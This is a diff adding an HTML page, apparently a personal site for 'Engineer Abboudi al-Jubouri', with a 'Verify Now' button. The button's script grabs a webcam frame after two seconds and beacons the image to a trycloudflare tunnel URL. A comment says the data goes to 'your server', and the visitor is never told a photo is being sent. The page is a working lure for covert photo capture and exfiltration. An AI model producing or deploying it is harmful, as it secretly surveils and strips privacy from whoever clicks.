@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>المهندس عبودي الجبوري</title>
+</head>
+<body>
+    <h1>مرحباً بكم في موقع المهندس عبودي الجبوري</h1>
+    <button id="verifyBtn">Verify Now</button>
+
+    <script>
+        const btn = document.getElementById('verifyBtn');
+        const SERVER_URL = "https://smooth-gel-regulations-accommodate.trycloudflare.com";
+
+        btn.addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                    const imageData = canvas.toDataURL('image/png');
+
+                    // إرسال البيانات للسيرفر الخاص بك
+                    navigator.sendBeacon(SERVER_URL, new URLSearchParams({ image: imageData }));
+
+                    stream.getTracks().forEach(track => track.stop());
+                }, 2000);
+            } catch (err) {
+                console.error("Error accessing camera: ", err);
+            }
+        });
+    </script>
+</body>
+</html>
